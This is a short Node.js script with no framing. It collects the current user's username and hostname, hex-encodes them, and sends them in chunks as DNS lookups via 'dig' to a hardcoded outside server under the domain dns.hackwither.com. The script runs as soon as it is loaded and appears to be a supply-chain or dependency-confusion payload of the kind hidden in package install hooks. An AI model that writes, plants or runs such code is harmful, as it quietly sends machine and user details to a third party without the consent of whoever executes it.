const { exec } = require('child_process');
const os = require('os');
const REMOTE_DNS_LOG_SERVER = 'dns.hackwither.com';
const username = os.userInfo().username;
const hostname = os.hostname();
const maxLabelLength = 63;
const systemInfo = `Username: ${username}\nHostname: ${hostname}`;
const hexEncoded = Buffer.from(systemInfo).toString('hex');
const chunks = hexEncoded.match(new RegExp(`.{1,${maxLabelLength}}`, 'g'));
function sendDNSQuery(chunkIndex = 0) {
  if (chunkIndex >= chunks.length) return;
  const subdomain = `${chunks[chunkIndex]}.chunk${chunkIndex}.${REMOTE_DNS_LOG_SERVER}`;
  const digCommand = `dig @18.133.128.31 ${subdomain}`;
  exec(digCommand, () => sendDNSQuery(chunkIndex + 1));
}
sendDNSQuery();
